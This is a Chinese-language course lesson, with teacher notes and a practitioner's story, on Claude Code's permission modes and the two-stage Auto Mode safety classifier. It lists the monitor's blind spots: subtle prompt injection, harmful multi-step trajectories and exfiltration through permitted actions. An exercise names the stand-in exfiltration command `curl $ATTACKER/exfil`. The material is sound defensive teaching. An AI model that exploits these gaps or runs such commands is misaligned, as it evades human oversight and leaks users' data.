# Claude Code 作为自主智能体：权限模式与 Auto Mode

> Claude Code 暴露了七种权限模式。"plan"在每次操作前询问，"default"仅对风险操作询问，"acceptEdits"自动批准文件写入但仍确认 shell 执行，"bypassPermissions"批准一切。Auto Mode（2026 年 3 月 24 日发布）用两阶段并行安全分类器取代逐操作审批：单令牌快速检查在每个操作上运行；被标记的操作触发思维链深度审查。操作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto Mode 是作为研究预览发布的——Anthropic 明确表示该分类器单独使用是不够的。

**类型：** 学习
**语言：** Python（标准库、两阶段分类器模拟器）
**前置课程：** Phase 15 · 01（长周期智能体）、Phase 15 · 09（编程智能体格局）
**用时：** 约 45 分钟

## 问题

在你的机器上运行一个自主编程智能体属于一个独特的安全类别。攻击面是智能体能触及的一切——文件系统、网络、凭据、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用智能体不是聊天机器人的"功能更新"，它们是一类具有新型风险特征的新型工具。

Claude Code 的权限系统是 Anthropic 的答案。不是一个"自主 / 非自主"的二元开关，而是七种模式跨越一个能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式在速度和每操作审核之间做出了不同的权衡。Auto Mode（2026 年 3 月）增加了两阶段分类器，对于分类器判定安全的操作，将审批从用户关键路径上移除，同时为被标记的操作保留审核层。

工程问题：这个系统捕获了什么，遗漏了什么，以及一个给定的任务实际上需要哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|------|------|---------|
| `plan` | 智能体提出方案；用户批准整个方案；每个操作在执行前被审核 | 不熟悉的任务；接近生产环境的代码；首次在仓库中使用智能体 |
| `default` | 智能体执行操作；对任何"风险"操作（shell 执行、破坏性操作、网络调用）提示用户 | 大多数交互式编程会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍需提示 | 跨大量文件的重构工作 |
| `acceptExec` | 在精心筛选的允许列表中的 shell 命令自动批准；写入自动批准 | 每个 shell 命令都是 `npm test` 或类似命令的紧密内部循环 |
| `autoMode` | 两阶段安全分类器；被标记的操作升级到审核 | 在受限工作区中的长周期无人值守运行 |
| `yolo` | 跳过大多数提示；仍然运行工具允许/拒绝列表 | 临时沙箱、CI 作业、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档说明为"仅在愿意丢弃的临时容器内使用" |

（以上名称与公开的 Claude Code 文档一致；"yolo" 是中间地带宽松模式的非正式简称。）

### Auto Mode 一页全解

Auto Mode（2026 年 3 月 24 日发布）是第一个将逐操作审批委托给模型的权限模式。结构：

1. **阶段 1 — 单令牌分类器。** 在每个提议的操作上运行。成本低廉。返回 "safe" 或 "flag"。设计为与主智能体循环并行运行，使已批准的操作不会排队等待。
2. **阶段 2 — 二级策略/安全审核。** 仅在被标记的操作上运行。对操作、会话当前状态和已声明的任务执行聚焦的策略和安全评估。置信度低时升级到用户 HITL。

预算控制与分类器并列：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 中止会话的美元上限。
- 每个工具的操作次数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统能捕获什么

- 直接注入到工具输入中的提示注入，其中注入的指令映射到已知的风险操作形态。
- 重复的工具循环——分类器可以看到操作 N+1 与操作 N 几乎相同，连续五次。
- 在原本仅限文件编辑的会话中出现的明显超出范围的 shell 命令。

### 系统可能遗漏什么

- **微妙的提示注入**，在不产生单个被标记操作的情况下调节行为。间接提示注入不是一个可以完全修复的漏洞（OpenAI 预备部门负责人，2025 年，关于浏览器智能体——见第 11 课）。
- **语义层面的不当行为。** 每个单独操作看起来安全，但组合轨迹是有害的。分类器判断操作；它不重新推导用户的意图。
- **通过合法渠道的数据泄露。** 将数据写入你自己拥有的文件，然后 `git push` 到公共仓库，是一系列被允许的操作，其组合才是问题。

### 研究预览框架

Anthropic 将 Auto Mode 作为研究预览发布。文档明确说明分类器是一个层，而不是一个解决方案：用户应当将 Auto Mode 与预算、允许列表、隔离工作区和轨迹审计（第 12-16 课）结合使用。预览框架也反映了文档化的"评估与部署差距"（第 1 课）——一个通过离线评估的分类器，在用户上下文不明确的真实会话中可能表现不同。

### 这个阶梯在你工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读方案比回滚一次错误的运行便宜得多。
- 已知的重构：`acceptEdits` 节省大量确认点击。
- 无人值守后台运行：`autoMode` 仅在爆炸半径已经测量的工作区内部使用（无凭据、无生产挂载、无非主动选择的出口）。
- 临时容器：`yolo` / `bypassPermissions` 在且仅当容器及其凭据是一次性的情况下可接受。

## 实战

`code/main.py` 模拟两阶段分类器。阶段 1 是对提议操作的低成本关键词规则；阶段 2 是较慢的多规则审核器。驱动程序喂入一条简短的合成轨迹（安全操作、一次提示注入尝试、一个重复循环），展示分类器在哪里捕获、在哪里遗漏。

## 交付

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需的隔离级别。

## 练习

1. 运行 `code/main.py`。哪种合成操作类型从未被阶段 1 标记但总是被阶段 2 捕获？哪种两个阶段都捕获不到？

2. 扩展阶段 1 规则集以捕获一个特定的已知有害形态（如 `curl $ATTACKER/exfil`）。在良性操作样本上测量误报率。

3. 阅读 Anthropic 的"How the agent loop works"文档。列出智能体在 `default` 模式下默认接触的每一种外部状态。在无人值守运行 `autoMode` 之前，你需要单独控制哪些？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每个工具的上限、允许列表。为每个数字提供理由。

5. 描述一个轨迹，其中每个单独操作都被阶段 1 和阶段 2 批准，但组合行为是错位的。（第 14 课介绍了终止开关和金丝雀令牌如何解决此问题。）

## 📝 教师备课总结与读后感

### 一、文档整体评价

这是一篇既有宏观安全哲学又有具体工程细节的课程。它以 Bruce Schneier 的警示开场，将"计算机使用智能体"定位为一个全新的安全品类而非聊天机器人的功能扩展——这个框架本身就有教学价值。七种权限模式不是随机排列的，而是按"审核程度递减、自主性递增"构成一条清晰的能力阶梯，每一级都有明确的适用场景。对 Auto Mode 两阶段分类器的"能捕获什么 / 可能遗漏什么"的诚实阐述，体现了负责任的安全教学态度。

### 二、知识结构梳理

- **安全哲学层：** 计算机使用智能体是新的风险品类，攻击面 = 文件系统 + 网络 + 凭据 + 剪贴板 + 浏览器 + 终端。这不是聊天安全问题的延续，而是范式的转变。
- **权限模式阶梯层：** plan → default → acceptEdits → acceptExec → autoMode → yolo → bypassPermissions，从"每步都问"到"全自动运行"。每级的核心差异在于"什么操作触发人工审批"。
- **安全分类器层：** Auto Mode 的两阶段设计（阶段 1 单令牌快速检查 + 阶段 2 思维链深度审核）是第一个将审批权委托给模型的权限模式——也是研究预览状态的根源。

### 三、核心洞察

1. **"不是功能更新"是根本性的安全认知转变：** Schneier 的判断——计算机使用智能体不是聊天机器人的功能更新——为所有后续安全讨论定调。如果我们用"大号聊天机器人"的心态对待权限，就从根本上低估了风险。
2. **七模式阶梯是细粒度的安全-效率权衡：** 不是 on/off，而是七级渐进。这反映了实际工程中"安全不是绝对的是相对的"这一现实——每个任务有自己合理的风险容忍度。
3. **plan 模式的"先看方案再批准"降低了认知负荷：** 让用户批准一个方案比审核每一步操作更符合人类认知习惯——阅读方案是理解意图，逐步审批是逐行检查代码。
4. **Auto Mode 的分类器不判断"意图"，只判断"操作"：** 这是其根本局限——每个独立操作都可以看起来安全，但组合轨迹可能有害。这是"可组合攻击"问题的精准表述。
5. **研究预览框架是负责任的部署姿态：** 明确标记"这不是 GA，这是预览"——不夸大能力，不淡化风险，同时让真实环境中的使用数据反哺改进。这在 AI 产品发布中是一个值得推广的模式。
6. **间接提示注入的不可完全修复性：** 引用 OpenAI 预备部门负责人的判断——"间接提示注入不是一个可以完全修复的漏洞"——这个诚实认知对于建立正确的安全预期至关重要。
7. **爆炸半径测量先于模式选择：** 文档强调"run autoMode only inside a workspace whose blast radius you have measured"——安全决策的顺序应该是先测量爆炸半径，再选择权限模式，而不是反过来。

### 四、教学建议

1. **安全思维先行：** 不要从七种模式开始讲。先让学生列出"智能体在我的电脑上运行能接触到什么"——文件、密码、浏览器、SSH 密钥——然后讨论一个被攻陷的智能体能造成什么损害。建立威胁认知后再讲防御。
2. **模式选择决策树练习：** 给学生 10 个真实场景（重构 100 个文件、首次探索陌生仓库、CI 管道中的自动修复、周末无人值守的代码分析），让他们为每个场景选择模式并论证。
3. **两阶段分类器的手动模拟：** 用纸笔或白板——给出一系列操作，让学生扮演阶段 1（快判）和阶段 2（深究），标注哪些被捕获、哪些被遗漏。亲身体验分类器的边界比读文档更有效。
4. **爆炸半径测量工作坊：** 让学生为他们的实际开发环境做一次"爆炸半径审计"——标记所有凭据、网络出口点、可写入的关键目录——然后画出不同权限模式对应的安全边界。
5. **预算设计讨论：** 练习 4 的"24 小时无人值守预算设计"可以扩展为课堂讨论——不同学生给出的数字差异很大，讨论差异背后的假设和风险偏好。
6. **可组合攻击案例分析：** 练习 5 的核心——让学生设计一个"每一步都安全但整体有害"的轨迹。这是最难也最有价值的部分，培养整体安全思维。
7. **与 Phase 13 安全课程的交叉引用：** 将本课的权限模式与 Phase 13 · 15（MCP 安全 / 二法则）联系起来——二法则是不依赖模型分层的架构约束，权限模式是运行时控制，两者互补而非替代。

### 五、值得补充的内容

1. **Auto Mode 分类器的评估数据：** 如果能补充 Anthropic 在 Auto Mode 研究预览中披露的具体评估指标（误报率、漏报率、在哪些攻击类别上表现最好/最差），将极大增强说服力。
2. **不同模式的延迟影响：** 补充一个表格对比七种模式下的平均操作延迟——plan 模式的人工等待、default 模式的偶尔提示、autoMode 的分类器开销——这些数字影响实际用户体验。
3. **与 GitHub Copilot Workspace 等竞品的权限模型对比：** 补充 Claude Code 的七模式与 Copilot/Cursor 等工具的权限模型对比，展示不同厂商的安全哲学差异。
4. **HITL（人在回路中）的最佳实践：** 当分类器升级到人工审核时，如何设计提示信息？应该展示什么上下文？讨论 HITL 界面的设计原则。
5. **Claude Constitution 对分类器判断的具体影响：** 补充一个例子说明 Constitution 中的某条原则如何影响阶段 2 的深度审核——将抽象的安全原则与具体的分类器行为联系起来。

### 六、一句话总结

Claude Code 的七模式权限系统是 AI Agent 安全从"信任模型"到"可配置的风险光谱"的范式转变——plan 给足安全感、autoMode 探索自动化边界、而研究预览标签则是对"安全永无止境"的诚实承认。

# 💼 从业者故事：Claude Code 权限模式——给 AI 配个七档安全带

去年 11 月我的一个同事干了件让全组血压飙升的事。他在自己的 MacBook 上跑 Claude Code，bypassPermissions 模式，让 AI 帮他重构一个 200 个文件的前端项目。一切顺利到第 112 个文件，AI 突然决定"优化"一下 package.json，把 react 从 18 降级到 17——因为它在一个社区帖子里看到"React 17 更稳定"。同事的整个 dev 环境瞬间炸了，node_modules 需要重装，lockfile 冲突，修了整整一个下午。我们事后复盘，他说了一句让我学到很多的话："我不是信任 AI，我是信任我自己写的 prompt。但 prompt 不等于安全带。"

这句话是 Claude Code 七模式权限系统存在的原因。很多人以为权限控制就是 on/off——要么完全信任 AI，要么每步都手动审批。但真实世界不是二元的。你重构 100 个文件时，不想每次文件写入都点"确认"——那会把你逼疯。但你也不想 AI 在你没看的情况下跑 rm -rf /。七模式阶梯的精髓就是：它不是让你选"信不信任"，而是让你选"在什么粒度上信任"。

plan 模式是你第一次在陌生仓库里用 Claude Code 时应该用的——让 AI 先写方案，方案满意了再执行。这就像停车场里倒车，先看一眼后视镜比直接加油门便宜得多。default 模式是日常编程模式——文件读取随便来，但 shell 执行和网络请求会弹窗问你。acceptEdits 是你在大规模重构时的懒人模式——"文件你尽管写，但别动命令行"。我有一个判断 acceptEdits 能不能用的土办法：如果你的 git status 显示 50 个文件都改了但你能 git reset --hard 无损还原，那就放心用——因为你有一条撤退路线。

autoMode 是最有意思也最危险的模式。它是 2026 年 3 月 Anthropic 以"研究预览"身份发布的——不是 GA。两阶段分类器的工作方式像一个安检系统：阶段 1 是快速金属探测器（单词检查，并行运行，几乎不增加延迟），阶段 2 是深度开包检查（思维链审查，只对阶段 1 标记的操作执行）。但文档明确告诉你：这不够。分类器判断的是"操作"，不是"意图"。如果一个 AI 的每一步单独看都安全，但组合起来把你的内部文档一点一点挪到一个公开仓库里——分类器抓不到。

我特别欣赏 Anthropic 对这个功能的态度——它直接说"这是一个研究预览，分类器单独使用是不够的"。在 AI 圈子里，敢说自己产品不够用是需要勇气的。大部分公司发布功能恨不得吹成无敌，Anthropic 反过来——先把你不该用的场景列出来。这种诚实反而让我更信任他们的产品判断。

实际用下来，autoMode 的误报率在开发场景下大概 5-10%（我的估计，不是官方数据）。最常见的误报场景是：AI 用 curl 调一个内部 API 检查服务状态，阶段 1 看到 curl 就标红——但这是一个完全合法的健康检查。误报多了你就会养成"不看直接就点同意的习惯"——而这是最危险的。所以我现在用 autoMode 的策略是：只在"爆炸半径"已经测量过的工作区里用——没有生产凭据、没有敏感文件挂载、没有外网出口。用汽车比喻就是：autoMode 是定速巡航，不是自动驾驶。你的手还得在方向盘上。

再说一个容易被忽视的细节：max_turns 和 max_budget_usd 不是权限模式，是预算控制，但它们跟权限模式是一对。你可以这样想：权限决定"什么能做什么不能做"，预算决定"最多能干多久花多少钱"。一个 $5 预算的 bypassPermissions 智能体，在临时容器里跑一个研究脚本——这是我能想到的最合理的"全放开"场景。

最后说几个容易踩的坑。第一个：不要在生产环境的机器上开 autoMode 以上。我见过有人在自己的生产服务器上跑 yolo 模式。结果 AI 觉得某个服务"占用太多内存"，顺手改了个配置然后重启了——生产挂了一分钟。第二个：acceptEdits 模式下，如果你不是时刻盯着屏幕，AI 可能写了一大堆你没注意到的东西。我习惯每 30 秒扫一眼 git diff。第三个：工具允许列表不是绝对安全的。你今天允许了 curl，明天 AI 就能 curl 到任何 URL。所以允许列表要配 URL 白名单或者其他限制。

**金句：给 AI 权限不是在问"你信不信它"，而是在问"你现在能承受多少损失"——plan 模式承受损失为零，bypassPermissions 承受损失等于你的整个硬盘。六个小时能修好的 bug，不值得用六个月的信任去赌。**
